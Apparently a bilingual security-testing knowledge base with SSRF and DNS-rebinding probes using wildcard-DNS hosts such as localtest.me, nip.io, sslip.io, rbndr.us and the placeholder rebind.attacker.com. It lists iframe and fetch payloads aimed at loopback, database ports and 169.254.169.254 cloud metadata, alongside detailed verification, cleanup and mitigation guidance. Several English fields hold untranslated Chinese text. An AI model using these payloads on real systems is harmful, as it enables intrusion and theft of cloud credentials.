description.zh: 在测试解析器中查询每个主机并只挑一个解析到受控标记服务的样例，记录 DNS、连接和请求令牌。 一次只验证一种机制，并以唯一无害标记替代真实敏感读取、系统修改或无边界扫描。
description.en: Resolve each host in the test resolver, select only one that points to a controlled marker service, and record DNS, connection, and request token. Validate one mechanism at a time and use a unique harmless marker instead of sensitive reads, system changes, or unbounded scanning.

title.zh: 核对编码地址通配 DNS证据

description.zh: 必须有解析后地址和受控服务日志的双重证据；域名格式看似编码 IP、解析超时或 NXDOMAIN 都不能确认。 对齐各层时间戳并排除输入回显、缓存、统一错误、网络抖动和测试工具自身行为。
description.en: Require both the post-resolution address and controlled-service log; a host that resembles an encoded IP, times out, or returns NXDOMAIN proves nothing. Align timestamps across layers and exclude reflection, caching, generic errors, network jitter, and behavior caused by the test tool itself.

title.zh: 修复并回归编码地址通配 DNS
title.en: Remediate and regress Encoded-Address Wildcard DNS

description.zh: 不要依赖域名外观，解析全部结果并做二进制地址分类；固定允许地址并通过出站代理阻断内网和元数据。 重放相同三组基线，合法路径应保持可用，异常输入不得再改变执行、文件访问或最终连接目标。
description.en: Do not trust hostname appearance; classify every resolved binary address, pin allowed destinations, and block internal and metadata ranges through an egress proxy. Replay the same three baselines; valid paths should remain functional and anomalous input must no longer alter execution, file access, or final destinations.

overview.zh: 1u.ms 编码地址 DNS SSRF 目标用于六个样例分别指向回环、链路本地和 RFC 1918 地址；外部服务行为可能变化，需先独立解析并留存 TTL。 审校时先确认执行主体、解析器、平台和授权测试对象，并保留未修改请求或命令作为正常基线。
overview.en: 1u.ms Encoded-Address DNS SSRF Targets is intended for this boundary: The six samples target loopback, link-local, and RFC 1918 ranges; resolve independently and record TTL because external service behavior can change. Confirm the execution principal, parser, platform, and authorized test object, and retain an unmodified baseline.

vulnerability.zh: 过滤器按域名文本允许请求，HTTP 客户端随后使用 DNS 返回的受阻地址，校验对象和连接对象不一致。 结论必须落到实际信任边界，不能把字符串外观、工具输出或中间层状态变化直接当成漏洞。
vulnerability.en: A filter approves the hostname text while the HTTP client uses a blocked address returned by DNS, making the validated and connected objects differ. The conclusion must identify the real trust boundary rather than treating string appearance, tool output, or intermediary status changes as a vulnerability.

exploitation.zh: 在测试解析器中查询每个主机并只挑一个解析到受控标记服务的样例，记录 DNS、连接和请求令牌。 必须有解析后地址和受控服务日志的双重证据；域名格式看似编码 IP、解析超时或 NXDOMAIN 都不能确认。 全程关联原始输入、规范化结果、进程或网络日志和最终业务影响，形成可重复的阳性与阴性证据。
exploitation.en: Resolve each host in the test resolver, select only one that points to a controlled marker service, and record DNS, connection, and request token. Require both the post-resolution address and controlled-service log; a host that resembles an encoded IP, times out, or returns NXDOMAIN proves nothing. Correlate raw input, canonicalized values, process or network logs, and final business impact to build repeatable positive and negative evidence.

mitigation.zh: 不要依赖域名外观，解析全部结果并做二进制地址分类；固定允许地址并通过出站代理阻断内网和元数据。 修复后用同一正常、阳性和阴性样例回归，确认合法功能保留，原先跨越解释器、文件或网络边界的差异消失。
mitigation.en: Do not trust hostname appearance; classify every resolved binary address, pin allowed destinations, and block internal and metadata ranges through an egress proxy. After remediation, replay the same normal, positive, and negative cases to preserve valid behavior and remove the former interpreter, file, or network-boundary difference.

name.zh: localtest.me 回环域名 SSRF 探测

description.zh: 使用解析到回环地址的 localtest.me 搭配服务端口，验证只拒绝 localhost 字符串的 SSRF 防护。
description.en: Uses localtest.me, which resolves to loopback, with service ports to test SSRF controls that reject only the localhost string.

prerequisites.zh: 已确认 localtest.me 当前解析到回环地址，并记录测试主机的 hosts/DNS 覆盖情况。
prerequisites.en: 已确认 localtest.me 当前解析到回环地址，并记录测试主机的 hosts/DNS 覆盖情况。

prerequisites.zh: 仅开放一个本地标记端口，并能证明请求由后端 URL 获取器而不是操作者浏览器发送。
prerequisites.en: Open only one local marker port and prove that requests come from the backend URL fetcher rather than the operator's browser.

title.zh: localtest.me本地测试域

description.zh: localtest.me本地测试域包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: localtest.me contains multiple reproducible input samples; test them individually and record response and log differences.

analysis.zh: 阳性是仅拒绝 localhost 字符串的规则允许 localtest.me，随后后端连接回环标记服务。DNS 回环解析本身、关闭端口的错误差异、或前端预览请求都不构成服务端访问。
analysis.en: 阳性是仅拒绝 localhost 字符串的规则允许 localtest.me，随后后端连接回环标记服务。DNS 回环解析本身、关闭端口的错误差异、或前端预览请求都不构成服务端访问。

opsecTips.zh: 标记端口收到一次后端请求即停止，不继续尝试列表中的数据库端口。
opsecTips.en: Stop when the marker port receives one backend request and do not continue to the listed database ports.

opsecTips.zh: 关闭本地服务，清理 DNS 与应用 URL 缓存，并删除测试令牌和回环访问日志。
opsecTips.en: Close the local service, clear DNS and application URL caches, and delete test tokens and loopback access logs.

title.zh: 确认回环别名域名解析适用边界
title.en: Confirm the Loopback Alias-Domain Resolution boundary

description.zh: 三个 URL 都是同一回环别名的端口变体，应用应按解析后 IP 判断，而不是按域名文本决定安全性。 记录正常输入、执行主体、组件版本和相关进程、文件或网络日志基线。
description.en: All three URLs are port variants of one loopback alias; the application must decide by resolved IP rather than hostname text. Record normal input, the execution principal, component version, and relevant process, file, or network-log baseline.

title.zh: 提交受控回环别名域名解析样例
title.en: Submit a controlled Loopback Alias-Domain Resolution case

description.zh: 先离线确认域名解析，再选择一个受控本地端口和一个关闭端口作对照，由应用各请求一次并记录连接。 一次只验证一种机制，并以唯一无害标记替代真实敏感读取、系统修改或无边界扫描。
description.en: Confirm resolution offline, then choose one controlled local port and one closed-port control, request each once through the application, and record connections. Validate one mechanism at a time and use a unique harmless marker instead of sensitive reads, system changes, or unbounded scanning.

attackChain.payload:
http://localtest.me:8080
http://localtest.me:3306
http://localtest.me:6379

title.zh: 核对回环别名域名解析证据

description.zh: 本地标记服务必须收到应用请求且连接地址为回环；DNS 解析、端口错误差异或浏览器自行请求都不够。 对齐各层时间戳并排除输入回显、缓存、统一错误、网络抖动和测试工具自身行为。
description.en: The local marker service must receive an application request with a loopback destination; DNS resolution, port-error differences, or browser-side requests are insufficient. Align timestamps across layers and exclude reflection, caching, generic errors, network jitter, and behavior caused by the test tool itself.

title.zh: 修复并回归回环别名域名解析
title.en: Remediate and regress Loopback Alias-Domain Resolution

description.zh: 对所有 DNS 结果进行地址分类并阻断回环，不为域名字符串设例外；使用出站允许列表限制端口和目标。 重放相同三组基线，合法路径应保持可用，异常输入不得再改变执行、文件访问或最终连接目标。
description.en: Classify every DNS result and block loopback without hostname exceptions, and constrain destinations and ports with an egress allowlist. Replay the same three baselines; valid paths should remain functional and anomalous input must no longer alter execution, file access, or final destinations.

overview.zh: localtest.me 回环域名 SSRF 探测用于三个 URL 都是同一回环别名的端口变体，应用应按解析后 IP 判断，而不是按域名文本决定安全性。 审校时先确认执行主体、解析器、平台和授权测试对象，并保留未修改请求或命令作为正常基线。
overview.en: localtest.me Loopback-Domain SSRF Probe is intended for this boundary: All three URLs are port variants of one loopback alias; the application must decide by resolved IP rather than hostname text. Confirm the execution principal, parser, platform, and authorized test object, and retain an unmodified baseline.

vulnerability.zh: 安全规则仅匹配 localhost 或 127.0.0.1，未解析其他域名；任何指向回环的公共域名都可绕过字符串规则。 结论必须落到实际信任边界，不能把字符串外观、工具输出或中间层状态变化直接当成漏洞。
vulnerability.en: A control matches only localhost or 127.0.0.1 without resolving other names, so any public name pointing to loopback can bypass the string rule. The conclusion must identify the real trust boundary rather than treating string appearance, tool output, or intermediary status changes as a vulnerability.

exploitation.zh: 先离线确认域名解析，再选择一个受控本地端口和一个关闭端口作对照，由应用各请求一次并记录连接。 本地标记服务必须收到应用请求且连接地址为回环；DNS 解析、端口错误差异或浏览器自行请求都不够。 全程关联原始输入、规范化结果、进程或网络日志和最终业务影响，形成可重复的阳性与阴性证据。
exploitation.en: Confirm resolution offline, then choose one controlled local port and one closed-port control, request each once through the application, and record connections. The local marker service must receive an application request with a loopback destination; DNS resolution, port-error differences, or browser-side requests are insufficient. Correlate raw input, canonicalized values, process or network logs, and final business impact to build repeatable positive and negative evidence.

mitigation.zh: 对所有 DNS 结果进行地址分类并阻断回环，不为域名字符串设例外；使用出站允许列表限制端口和目标。 修复后用同一正常、阳性和阴性样例回归，确认合法功能保留，原先跨越解释器、文件或网络边界的差异消失。
mitigation.en: Classify every DNS result and block loopback without hostname exceptions, and constrain destinations and ports with an egress allowlist. After remediation, replay the same normal, positive, and negative cases to preserve valid behavior and remove the former interpreter, file, or network-boundary difference.

name.zh: 低 TTL DNS Rebinding SSRF 探测

description.zh: 使用低 TTL 或交替应答域名测试校验阶段与连接阶段是否发生不同 DNS 解析。
description.en: 使用低 TTL 或交替应答域名测试校验阶段与连接阶段是否发生不同 DNS 解析。

prerequisites.zh: 使用自有测试域配置可审计的低 TTL/交替 A 记录，不依赖示例 `rebind.attacker.com`。
prerequisites.en: Use an owned test domain with auditable low-TTL or alternating A records rather than the placeholder `rebind.attacker.com`.

prerequisites.zh: 受控外部和回环标记服务共享唯一请求令牌，且可观察校验、重试和连接的 DNS 查询序列。
prerequisites.en: Controlled external and loopback markers share a unique request token, and DNS lookups during validation, retry, and connection are observable.

title.zh: TTL=0 交替响应技术
title.en: Validation step 1 for Low-TTL DNS Rebinding SSRF Probe

execution.command:
http://rebind.attacker.com
http://rebind.attacker.com:8080
http://rebind.attacker.com:3306
http://rebind.attacker.com:6379
http://rebind.attacker.com:27017
http://rebind.attacker.com:9200
http://rebind.attacker.com:5432

description.zh: TTL=0 交替响应技术包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Low-TTL DNS Rebinding SSRF Probe validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性要求首次校验得到允许的外部地址，后续同一请求重新解析为回环并连接标记服务。TTL=0、多次查询、地址顺序变化或客户端固定首答而未访问内部端都不是利用。
analysis.en: Positive evidence requires validation to receive an allowed external address and a later resolution for the same request to return loopback and reach the marker. TTL zero, repeated queries, answer reordering, or a client pinning the first answer without internal access is not exploitation.

opsecTips.zh: 首次观察检查时/使用时地址切换并到达回环后停止，不切换到元数据或私网数据库。
opsecTips.en: Stop at the first validation-to-use address switch reaching loopback; do not switch to metadata or private databases.

opsecTips.zh: 恢复测试 DNS 区的固定记录，等待缓存过期，关闭两端标记服务并删除唯一令牌。
opsecTips.en: Restore a fixed DNS record in the test zone, wait for caches to expire, shut down both marker services, and delete the unique token.

title.zh: 确认DNS TOCTOU Rebinding适用边界
title.en: Confirm the DNS TOCTOU Rebinding boundary

description.zh: rebind.attacker.com 是占位域名，实际测试必须由授权者控制 DNS，并明确首答外部、后答内部的时序。 记录正常输入、执行主体、组件版本和相关进程、文件或网络日志基线。
description.en: rebind.attacker.com is a placeholder; testing requires operator-controlled DNS with explicit external-first and internal-later timing. Record normal input, the execution principal, component version, and relevant process, file, or network-log baseline.

title.zh: 提交受控DNS TOCTOU Rebinding样例
title.en: Submit a controlled DNS TOCTOU Rebinding case

description.zh: 在隔离 DNS 区配置可审计的交替 A 记录，用受控外部与回环标记服务记录查询序列、TTL 和最终连接。 一次只验证一种机制，并以唯一无害标记替代真实敏感读取、系统修改或无边界扫描。
description.en: Configure auditable alternating A records in an isolated DNS zone and use controlled external and loopback marker services to record lookup order, TTL, and final connection. Validate one mechanism at a time and use a unique harmless marker instead of sensitive reads, system changes, or unbounded scanning.

attackChain.payload:
http://rebind.attacker.com
http://rebind.attacker.com:8080
http://rebind.attacker.com:3306
http://rebind.attacker.com:6379
http://rebind.attacker.com:27017
http://rebind.attacker.com:9200
http://rebind.attacker.com:5432

title.zh: 核对DNS TOCTOU Rebinding证据

description.zh: 需要 DNS 权威日志证明两次答案不同，并由内部标记服务收到同一请求令牌；低 TTL 本身或多次查询不构成利用。 对齐各层时间戳并排除输入回显、缓存、统一错误、网络抖动和测试工具自身行为。
description.en: Authoritative DNS logs must show different answers and the internal marker must receive the same request token; low TTL or repeated queries alone is not exploitation. Align timestamps across layers and exclude reflection, caching, generic errors, network jitter, and behavior caused by the test tool itself.

title.zh: 修复并回归DNS TOCTOU Rebinding
title.en: Remediate and regress DNS TOCTOU Rebinding

description.zh: 解析并固定已允许 IP，连接到固定地址且保持正确 Host/SNI；限制重新解析，重试和重定向必须重新执行完整地址策略。 重放相同三组基线，合法路径应保持可用，异常输入不得再改变执行、文件访问或最终连接目标。
description.en: Resolve and pin approved IPs, connect to the pinned address with correct Host and SNI, constrain re-resolution, and reapply full address policy on retries and redirects. Replay the same three baselines; valid paths should remain functional and anomalous input must no longer alter execution, file access, or final destinations.

overview.zh: 低 TTL DNS Rebinding SSRF 探测用于rebind.attacker.com 是占位域名，实际测试必须由授权者控制 DNS，并明确首答外部、后答内部的时序。 审校时先确认执行主体、解析器、平台和授权测试对象，并保留未修改请求或命令作为正常基线。
overview.en: Low-TTL DNS Rebinding SSRF Probe is intended for this boundary: rebind.attacker.com is a placeholder; testing requires operator-controlled DNS with explicit external-first and internal-later timing. Confirm the execution principal, parser, platform, and authorized test object, and retain an unmodified baseline.

vulnerability.zh: 应用先解析并允许外部 IP，连接或重试时重新解析得到内部 IP，低 TTL 和未固定地址形成检查时/使用时竞态。 结论必须落到实际信任边界，不能把字符串外观、工具输出或中间层状态变化直接当成漏洞。
vulnerability.en: The application approves an external IP from an initial lookup and re-resolves an internal IP during connection or retry, creating a TOCTOU race without address pinning. The conclusion must identify the real trust boundary rather than treating string appearance, tool output, or intermediary status changes as a vulnerability.

exploitation.zh: 在隔离 DNS 区配置可审计的交替 A 记录，用受控外部与回环标记服务记录查询序列、TTL 和最终连接。 需要 DNS 权威日志证明两次答案不同，并由内部标记服务收到同一请求令牌；低 TTL 本身或多次查询不构成利用。 全程关联原始输入、规范化结果、进程或网络日志和最终业务影响，形成可重复的阳性与阴性证据。
exploitation.en: Configure auditable alternating A records in an isolated DNS zone and use controlled external and loopback marker services to record lookup order, TTL, and final connection. Authoritative DNS logs must show different answers and the internal marker must receive the same request token; low TTL or repeated queries alone is not exploitation. Correlate raw input, canonicalized values, process or network logs, and final business impact to build repeatable positive and negative evidence.

mitigation.zh: 解析并固定已允许 IP，连接到固定地址且保持正确 Host/SNI；限制重新解析，重试和重定向必须重新执行完整地址策略。 修复后用同一正常、阳性和阴性样例回归，确认合法功能保留，原先跨越解释器、文件或网络边界的差异消失。
mitigation.en: Resolve and pin approved IPs, connect to the pinned address with correct Host and SNI, constrain re-resolution, and reapply full address policy on retries and redirects. After remediation, replay the same normal, positive, and negative cases to preserve valid behavior and remove the former interpreter, file, or network-boundary difference.

name.zh: 浏览器 DNS Rebinding Iframe 探测

description.zh: 使用 nip.io、sslip.io、rbndr.us 与 1u.ms 主机名的 iframe 验证浏览器导航到回环/元数据地址映射时的来源、网络边界与加载结果。
description.en: Uses iframe URLs on nip.io, sslip.io, rbndr.us, and 1u.ms to test browser origin, network boundaries, and load results when names map to loopback or metadata addresses.

subCategory.zh: 浏览器 DNS Rebinding 导航

prerequisites.zh: 仅在隔离浏览器、专用测试页面与本地无敏感标记服务中验证
prerequisites.en: Testing occurs only in an isolated browser, dedicated page, and local nonsensitive marker service.

prerequisites.zh: 可观察 DNS、浏览器 Network/Origin 和标记服务日志
prerequisites.en: DNS, browser Network or Origin, and marker-service logs are observable.

title.zh: 通配 DNS Iframe URL

description.zh: 原行含公共解析与元数据地址。真实验证应改用自有隔离 DNS 名称和本地标记服务，不请求 169.254.169.254 或第三方公共服务。
description.en: 原行含公共解析与元数据地址。真实验证应改用自有隔离 DNS 名称和本地标记服务，不请求 169.254.169.254 或第三方公共服务。

analysis.zh: 阳性需区分三层：DNS 答案变化、iframe 成功连接、父页面在同源模型下读取内部标记。只有前两层时不是完整 Rebinding；浏览器错误页和公共 DNS 结果是假阳性。
analysis.en: A positive has three distinct layers: DNS answer change, iframe connection, and parent-page read of the internal marker under the origin model. The first two alone are not full rebinding; browser error pages and public DNS behavior are false positives.

opsecTips.zh: 只使用自有 DNS 和本地标记服务，禁止请求云元数据或真实内网；达到预定层级即停止。
opsecTips.en: Use only controlled DNS and local marker services, never cloud metadata or real internal networks, and stop at the planned evidence level.

opsecTips.zh: 测试后删除 DNS 记录、关闭标记端口、销毁浏览器上下文并清理缓存。
opsecTips.en: After testing delete DNS records, close marker ports, destroy the browser context, and clear caches.

title.zh: 建立隔离 DNS 与标记服务
title.en: Establish isolated DNS and marker services

description.zh: 配置自有名称、可审计 TTL 和两个仅返回固定标记的端点。
description.en: Configure a controlled name, auditable TTL, and two endpoints that return only fixed markers.

title.zh: 改写并逐个加载 Iframe
title.en: Rewrite and load iframes one by one

description.zh: 替换公共/元数据地址，在全新浏览器上下文一次加载一个 iframe。
description.en: Replace public and metadata addresses and load one iframe per fresh browser context.

attackChain.payload:
<iframe src="http://127.0.0.1.nip.io/"></iframe>
<iframe src="http://169.254.169.254.nip.io/latest/meta-data/"></iframe>
<iframe src="http://127.0.0.1.sslip.io/"></iframe>
<iframe src="http://169.254.169.254.sslip.io/latest/meta-data/"></iframe>
<iframe src="http://127.0.0.1-169.254.169.254.rbndr.us/"></iframe>
<iframe src="http://127.0.0.1.7f000001.1u.ms/"></iframe>

title.zh: 核对 DNS、Origin 与加载证据
title.en: Verify DNS, origin, and load evidence

description.zh: 匹配权威日志、浏览器 origin、标记服务请求和 DOM 读取结果，区分加载与同源读取。
description.en: Match authoritative logs, browser origin, marker requests, and DOM read results to distinguish loading from same-origin reading.

title.zh: 停止、清理 DNS 并回归

description.zh: 删除测试记录和页面，修复 Host/Origin/网络边界后重复基线确认内部内容不可读。
description.en: Remove test records and pages, fix Host, Origin, and network boundaries, and repeat the baseline to confirm internal content is unreadable.

overview.zh: iframe 行由浏览器执行，不是服务端 SSRF。它们可测试主机名解析到本地地址后页面是否加载，以及后续同源约束，但 iframe 可见或发生请求并不自动允许父页面读取内容。
overview.en: iframe 行由浏览器执行，不是服务端 SSRF。它们可测试主机名解析到本地地址后页面是否加载，以及后续同源约束，但 iframe 可见或发生请求并不自动允许父页面读取内容。

vulnerability.zh: 浏览器 DNS Rebinding 依赖同一主机名在不同时间解析到攻击者和内部地址，并利用源按 scheme/host/port 而非 IP 定义。内部服务若不校验 Host/Origin 且浏览器连接被允许，可能暴露接口。
vulnerability.en: Browser DNS rebinding depends on one hostname resolving to attacker and internal addresses over time while origin is defined by scheme, host, and port rather than IP. An internal service without Host or Origin validation may expose interfaces if browser connections are allowed.

exploitation.zh: 在自有 DNS 区和两个无敏感标记服务中记录首答、后答、TTL、iframe origin 与请求。先只证明 iframe 加载，再尝试读取固定公开标记并核对同源异常。公共 wildcard DNS、元数据服务和真实内网均不使用。
exploitation.en: Use a controlled DNS zone and two nonsensitive marker services to record first and later answers, TTL, iframe origin, and requests. Prove frame loading first, then test reading a fixed public marker and inspect origin behavior. Do not use public wildcard DNS, metadata services, or real internal networks.

mitigation.zh: 内部 Web 服务校验 Host/Origin、使用认证和 CSRF 防护并避免仅依赖网络位置；浏览器/终端采用网络隔离与私网访问策略。DNS 测试域隔离，应用在必要时使用 HTTPS/证书和明确允许来源。
mitigation.en: Internal web services should validate Host and Origin, require authentication and CSRF protection, and not rely on network location alone. Apply endpoint network isolation and private-network access controls, isolate test DNS zones, and use HTTPS certificates and explicit allowed origins where appropriate.

name.zh: 浏览器 DNS Rebinding Fetch 探测

description.zh: 使用 fetch 脚本访问回环或元数据映射主机并将响应写入标题，验证浏览器 DNS、同源读取与内部服务响应边界。
description.en: Uses fetch scripts against loopback or metadata-mapped names and writes responses to the title to test browser DNS, same-origin reads, and internal-service response boundaries.

prerequisites.zh: 隔离页面与标记服务同属自有测试环境，浏览器网络日志可采集
prerequisites.en: The isolated page and marker service are controlled test assets and browser network logs are available.

prerequisites.zh: 脚本改写为只比较固定标记，不将响应写入标题或日志
prerequisites.en: Scripts are rewritten to compare only a fixed marker and do not write response bodies to the title or logs.

title.zh: 通配 DNS Fetch 脚本

description.zh: 原脚本会泄露响应到标题。实际验证替换为自有 DNS/标记服务，并只把 `t===MARKER` 的布尔结果写入内存；禁止访问元数据或公共 rebinding 服务。
description.en: 原脚本会泄露响应到标题。实际验证替换为自有 DNS/标记服务，并只把 `t===MARKER` 的布尔结果写入内存；禁止访问元数据或公共 rebinding 服务。

analysis.zh: 完整阳性要求应用脚本读取内部固定标记。DNS 变化、TCP 请求、CORS 错误、opaque 响应或 document.title 的静态值是假阳性/部分证据。
analysis.en: A complete positive requires the application script to read the internal fixed marker. DNS changes, TCP requests, CORS errors, opaque responses, or a static document.title value are false positives or partial evidence.

opsecTips.zh: 禁止访问元数据/真实内网，仅读取自有单值标记；一旦可读立即停止。
opsecTips.en: Never access metadata or real internal networks; read only a controlled one-value marker and stop as soon as it is readable.

opsecTips.zh: 测试后销毁浏览器 Profile、删除 DNS 记录与页面脚本，并关闭所有监听器。
opsecTips.en: Destroy the browser profile, delete DNS records and page scripts, and close every listener afterward.

title.zh: 部署固定标记响应

description.zh: 自有外部/内部标记服务只返回随机常量并记录 Origin/Host。
description.en: Controlled external and internal marker services return only a random constant and log Origin and Host.

title.zh: 改写并逐个执行 Fetch
title.en: Rewrite and run fetch probes individually

description.zh: 替换地址和标题写入逻辑，每个浏览器上下文只执行一条。
description.en: Replace addresses and title-writing logic and execute one line per browser context.

attackChain.payload:
<script>fetch('http://127.0.0.1.nip.io/').then(r=>r.text()).then(t=>document.title=t)</script>
<script>fetch('http://169.254.169.254.nip.io/latest/meta-data/').then(r=>r.text()).then(t=>document.title=t)</script>
<script>fetch('http://127.0.0.1-169.254.169.254.rbndr.us/').then(r=>r.text()).then(t=>document.title=t)</script>

title.zh: 确认响应可读性而非仅连接
title.en: Confirm response readability, not only connection

description.zh: 匹配 DNS、请求、Origin/CORS/PNA 与内存布尔标记，区分 opaque 响应。
description.en: Match DNS, request, Origin or CORS or PNA, and the in-memory Boolean marker, distinguishing opaque responses.

title.zh: 清理并验证浏览器/服务控制
title.en: Clean up and verify browser and service controls

description.zh: 删除页面/DNS、关闭服务并修复认证/Origin 后重放，确认固定标记不可读。
description.en: Remove page and DNS, close services, fix authentication and Origin checks, and replay to confirm the marker is unreadable.

overview.zh: fetch 比 iframe 更强，因为成功读取响应需要满足 CORS/同源和私网访问约束。原脚本把任意内容写入 document.title，不适合作为安全验证；应改为固定标记布尔值。
overview.en: fetch 比 iframe 更强，因为成功读取响应需要满足 CORS/同源和私网访问约束。原脚本把任意内容写入 document.title，不适合作为安全验证；应改为固定标记布尔值。

vulnerability.zh: 若攻击者页面的主机名先指向其服务器、后解析到内部服务，浏览器可能仍按相同 host 判断来源。内部服务缺少 Host/Origin/认证控制时，脚本可读取接口响应；现代浏览器策略可能阻断。
vulnerability.en: If an attacker page hostname first resolves externally and later internally, the browser may still consider the host the same origin. A script may read an internal service lacking Host, Origin, or authentication controls, though modern browser policies can block it.

exploitation.zh: 在自有 DNS 区与只返回固定标记的本地服务，改写脚本并使用全新浏览器上下文。记录 DNS 序列、fetch mode、CORS/PNA、origin、网络和布尔标记。网络请求成功但响应 opaque/不可读不是完整阳性。
exploitation.en: Use a controlled DNS zone and local fixed-marker service, rewrite the script, and use a fresh browser context. Record DNS sequence, fetch mode, CORS or PNA, origin, network, and Boolean marker. A successful request with an opaque or unreadable response is not a complete positive.

mitigation.zh: 内部 API 使用强认证和对象授权，校验 Host/Origin，不信任来源网段；配置 CORS/PNA 最小允许范围并使用 HTTPS。客户端/网络隔离敏感服务，DNS 和代理防止不受信域解析/连接私网。
mitigation.en: Protect internal APIs with strong authentication and object authorization, validate Host and Origin, and do not trust network location. Minimize CORS and PNA allowances, use HTTPS, isolate sensitive services, and prevent untrusted names from resolving or connecting to private networks.

name.zh: SSRF 通配 DNS 零地址解析

description.zh: 使用解析到 0.0.0.0 的 nip.io/sslip.io URL 验证服务端获取器是否在解析后把未指定地址视为本机或允许目标。
description.en: 使用解析到 0.0.0.0 的 nip.io/sslip.io URL 验证服务端获取器是否在解析后把未指定地址视为本机或允许目标。

subCategory.zh: 通配 DNS 与特殊地址

prerequisites.zh: 隔离获取器由服务端发起 URL 请求，且本地 8080 仅运行固定标记服务
prerequisites.en: 隔离获取器由服务端发起 URL 请求，且本地 8080 仅运行固定标记服务

prerequisites.zh: 公共域名在验证前替换为自有 DNS 名称，解析和连接日志可审计
prerequisites.en: Public names are replaced with a controlled DNS name and resolution and connection logs are auditable.

title.zh: 零地址通配 DNS URL

description.zh: 用自有域解析到隔离实例的特殊地址，并由本地 8080 标记服务响应；不要依赖公共 nip.io/sslip.io 或扫描其他端口。
description.en: Use a controlled name resolving to the special address in isolation and a local port-8080 marker service; do not depend on public nip.io or sslip.io or scan other ports.

analysis.zh: 阳性要求服务端 socket 实际连接隔离本地 8080。域名解析到 0.0.0.0、错误信息、端口超时或浏览器请求是假阳性/不足证据。
analysis.en: A positive requires the server socket to connect to isolated local port 8080. DNS resolving to 0.0.0.0, errors, port timeout, or a browser request is false or insufficient evidence.

opsecTips.zh: 只验证单一 8080 标记服务，禁止扫描其他本机/内网端口，连接成功即停止。
opsecTips.en: Test only one marker service on port 8080, never scan other local or internal ports, and stop on the first connection.

opsecTips.zh: 测试后删除自有 DNS 记录、关闭监听器并清理请求日志中的令牌。
opsecTips.en: Delete controlled DNS records, close the listener, and remove request tokens from logs afterward.

title.zh: 建立服务端外部获取基线
title.en: 建立服务端外部获取基线

description.zh: 使用唯一标记确认请求来自应用服务器并记录其解析/连接流程。
description.en: Use a unique marker to confirm the request comes from the application server and record resolution and connection flow.

title.zh: 提交自有零地址域名

description.zh: 替换公共域后逐条请求，并只监听隔离 8080。
description.en: Replace public domains, request one at a time, and listen only on isolated port 8080.

title.zh: 确认最终 Socket 目标

description.zh: 匹配 DNS、连接地址、本地标记日志和请求令牌，排除客户端/健康检查。
description.en: Match DNS, connection address, local marker logs, and request token, excluding client or health-check traffic.

title.zh: 阻断特殊地址并清理
title.en: Block special addresses and clean up

description.zh: 修复后重放合法外部 URL 与零地址域，确认前者可用而后者在连接前拒绝；删除 DNS/服务。
description.en: After remediation replay valid external and zero-address names to preserve the former and reject the latter before connection, then remove DNS and services.

overview.zh: 0.0.0.0 是 IPv4 未指定地址，不同操作系统/客户端在连接时可能拒绝或解释为本地。主机名字符串看似外部不重要，安全校验必须基于解析后的地址和最终连接目标。
overview.en: 0.0.0.0 是 IPv4 未指定地址，不同操作系统/客户端在连接时可能拒绝或解释为本地。主机名字符串看似外部不重要，安全校验必须基于解析后的地址和最终连接目标。

vulnerability.zh: 根因是 SSRF 过滤只检查原始 host 字符串或禁止字面 IP，却未分类解析结果与特殊地址。通配 DNS 将可疑地址隐藏在域名后，连接库可能最终访问本地服务。
vulnerability.en: The cause is SSRF filtering that checks raw host strings or literal IPs without classifying resolved and special-use addresses. Wildcard DNS hides the address behind a name and the connection library may reach a local service.

exploitation.zh: 先用自有外部标记 URL 证明服务端请求，再以自有 DNS 名替代两行并解析到隔离零地址，记录解析、socket 目标和本地标记请求。只有服务端连接到本地 8080 且携带唯一请求标记才成立；DNS 答案或超时不足。
exploitation.en: Prove server retrieval with a controlled external marker, replace both public names with a controlled name resolving to the isolated zero address, and record DNS, socket destination, and local marker request. A positive requires the server to connect to local port 8080 with the unique token; DNS or timeout is insufficient.

mitigation.zh: 解析全部 A/AAAA 后分类并阻断未指定、回环、链路本地、私网和其他非业务地址，连接到固定已批准 IP，并在重定向/重试时重复校验。网络层限制获取服务出站。
mitigation.en: 解析全部 A/AAAA 后分类并阻断未指定、回环、链路本地、私网和其他非业务地址，连接到固定已批准 IP，并在重定向/重试时重复校验。网络层限制获取服务出站。

name.zh: SSTI 通用表达式探测

description.zh: 用于识别服务端是否把不受信任输入交给模板引擎求值，并通过多种表达式语法区分潜在引擎类型。
description.en: 用于识别服务端是否把不受信任输入交给模板引擎求值，并通过多种表达式语法区分潜在引擎类型。

prerequisites.zh: 可控值进入服务端模板源码或被二次编译的表达式位置，而不是仅作为已绑定变量输出；渲染引擎与版本可确认。
prerequisites.en: 可控值进入服务端模板源码或被二次编译的表达式位置，而不是仅作为已绑定变量输出；渲染引擎与版本可确认。

prerequisites.zh: 为候选语法准备原样字符串、简单算术和错误表达式三组对照，并保存模板源码、编译调用栈、输出与请求 ID。
prerequisites.en: Literal-string, simple-arithmetic, and malformed-expression controls are prepared for candidate syntax, preserving template source, compilation stack, output, and request identifier.

title.zh: 通用探测
title.en: Validation step 1 for Generic SSTI Expression Probes

description.zh: 通用探测包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Generic SSTI Expression Probes validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性证据是目标服务端模板引擎解析可控表达式并产生与该引擎语义一致的确定 canary 结果，编译/渲染日志可回溯到输入。 假阳性边界：算术文本来自客户端 JavaScript、表达式原样回显、应用预先计算 49、错误页猜测引擎、多个引擎语法碰巧相同或静态扫描命中都不是 SSTI。
analysis.en: 阳性证据是目标服务端模板引擎解析可控表达式并产生与该引擎语义一致的确定 canary 结果，编译/渲染日志可回溯到输入。 假阳性边界：算术文本来自客户端 Java Script、表达式原样回显、应用预先计算 49、错误页猜测引擎、多个引擎语法碰巧相同或静态扫描命中都不是 SSTI。

opsecTips.zh: 通用 SSTI 指纹只使用算术/字符串 canary；出现对象图遍历、配置泄露、文件/网络访问、进程创建、模板缓存污染或 worker 异常时停止。
opsecTips.en: Generic SSTI fingerprinting uses arithmetic or string canaries only; stop on object-graph traversal, configuration disclosure, file or network access, process creation, template-cache contamination, or worker anomalies.

opsecTips.zh: 删除测试模板和输入记录，清理编译模板/页面缓存与 canary，重启隔离 renderer，并用普通变量回归渲染路径。
opsecTips.en: Delete test templates and input records, clear compiled-template and page caches plus canaries, restart the isolated renderer, and regress the render path with ordinary variables.

